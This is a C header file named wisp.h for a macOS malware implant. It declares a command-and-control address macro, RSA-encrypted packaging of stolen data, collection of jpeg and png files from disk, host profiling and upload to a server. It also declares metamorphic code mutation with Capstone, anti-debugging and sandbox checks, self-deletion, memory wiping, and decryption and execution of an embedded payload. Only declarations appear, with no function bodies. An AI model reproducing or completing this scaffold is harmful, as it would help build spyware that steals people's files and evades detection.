#ifndef WISP_H
#define WISP_H  

//=========================================
//              INCLUDES
//=========================================
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/random.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <ftw.h>
#include <libgen.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <mach-o/loader.h>
#include <dlfcn.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <zlib.h>
#include <capstone/capstone.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <uuid/uuid.h>
#include <sys/xattr.h>

//=========================================
//              MACROS
//=========================================
#define PS    4096      // P size
#define B     65536     
#define MU    1         // Mutation passes count
#define JU    16        // Junk 
#define K     32        // Key size
#define SZ    64        // Stub size
#define MF    5         
#define C2    ""        // C2 (NEVER STATIC!)
#define KU    ""        // Public key `PEM`
#define PWD   256       // Password

//=========================================
//             STRUCTURES
//=========================================

// Encrypted (packed for precise layout)
typedef struct __attribute__((packed)) {
    uint8_t  key[K], iv[16];
    uint64_t seed;
    uint32_t count;
    uint8_t  hash[CC_SHA256_DIGEST_LENGTH], hmac[CC_SHA256_DIGEST_LENGTH];
} ENHEADER; 

// ChaCha-based RNG context
typedef struct {
    uint8_t key[K], iv[12], key_stream[64];
    size_t position;
    uint64_t counter;
} ChaChaRNG;

// File collection
typedef struct {
    char *path;
    size_t size;
} Object;

// Mutation routines
typedef struct {
    csh handle;
    cs_insn *insns;
    size_t count;
    uint8_t *original;
    size_t size;
    ChaChaRNG rng;
} MutC;  

// Memory clearing
typedef enum {
    ZERO,    // Fill with 0x00.
    ONE,     // Fill with 0xFF.
    RAND,  
    CUST  
} wipe_pattern_t;

// Wiping operations
typedef struct {
    int passes;               
    wipe_pattern_t *patterns;  
    unsigned char custom; 
} wipe_config_t;

// CURL callbacks
struct Mem {
    char *data;
    size_t size;
};

//=========================================
//     MACH-O SECTION & GLOBALS
//=========================================
extern struct mach_header_64 _mh_execute_header;
__attribute__((used, section("__DATA,__fdata")))
static uint8_t data[sizeof(ENHEADER) + PS];
static const char *EXTS[] = {"jpeg", "png", NULL};
extern char sws[PWD];
#if defined(__x86_64__)
extern const uint8_t ramp[];
extern const size_t te_len;
#elif defined(__arm64__)
extern const uint8_t ramp[];
extern const size_t te_len;
#endif

extern volatile uint32_t dex;
extern volatile void (*tramp_[])(void);

//=========================================
//         SYSTEM & ARCHITECTURE
//=========================================
typedef int (*sysctl_func_t)(int *, u_int, void *, size_t *, void *, size_t);

#if defined(__x86_64__)
  #define ARCH_X86 1
  #define TARGET_ARCH CS_ARCH_X86
  #define TARGET_MODE CS_MODE_64
  #include <capstone/x86.h>
#elif defined(__arm64__)
  #define ARCH_ARM 1
  #define TARGET_ARCH CS_ARCH_ARM64
  #define TARGET_MODE 0
  #include <capstone/arm64.h>
#else
  #error "Unsupported architecture"
#endif

//=========================================
//       INLINE & HELPER MACROS
//=========================================
#define encrypt_payload(k,iv,in,out,len) crypt_payload(1, k, iv, in, out, len)
#define decrypt_payload(k,iv,in,out,len) crypt_payload(0, k, iv, in, out, len)
#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
#define QR(a, b, c, d)  (a += b, d ^= a, d = ROTL32(d, 16), \
                          c += d, b ^= c, b = ROTL32(b, 12), \
                          a += b, d ^= a, d = ROTL32(d, 8),  \
                          c += d, b ^= c, b = ROTL32(b, 7))

//=========================================
//          DECLARATIONS
//=========================================
char *gctl(void);
sysctl_func_t getsys(void);
int Psys(int *mib, struct kinfo_proc *info, size_t *size);
bool Se(const struct kinfo_proc *info);
bool De(void);
void chacha20_block(const uint32_t key[8], uint32_t counter, const uint32_t nonce[3], uint32_t out[16]);
uint32_t chacha20_random(ChaChaRNG *rng);
void chacha20_init(ChaChaRNG *rng, const uint8_t *seed, size_t len);
void _memcpy(void *dst, const void *src, size_t len);
void zer(void *p, size_t len);
int autodes(void);
void whereyouat(void);
void mutate(uint8_t *code, size_t sz, ChaChaRNG *rng);
void mutate_p(uint8_t *code, size_t sz, ChaChaRNG *rng);
void crypt_payload(int enc, const uint8_t *key, const uint8_t *iv,
                   const uint8_t *in, uint8_t *out, size_t len);
size_t callback(void *contents, size_t size, size_t nmemb, void *userp);
RSA* get_rsa(const char* url);
void overn_out(const char *server_url, const unsigned char *data, size_t size);
void profiler(char *buffer, size_t *offset);
void generate_id(char *id);
unsigned char* encrypt_and_package(const unsigned char *plaintext, 
                                   size_t plaintext_len,
                                   size_t *out_len, 
                                   RSA *rsa_pub);
void send_profile(RSA *rsa_pub);
int copy_file(const char *src, const char *dst);
int file_collector(const char *fpath, const struct stat *sb,
                   int typeflag, struct FTW *ftwbuf);
unsigned char* compress_data(const unsigned char *in, size_t in_len, size_t *out_len);
void send_files_bundle(RSA *rsa_pub);
int sendprofile(void);
void save(uint8_t *data, size_t sz);
void execute(uint8_t *code, size_t sz);
bool check_priv(uint8_t *code, size_t sz);

//=========================================
//              END OF IT
//=========================================
#endif // WISP_H
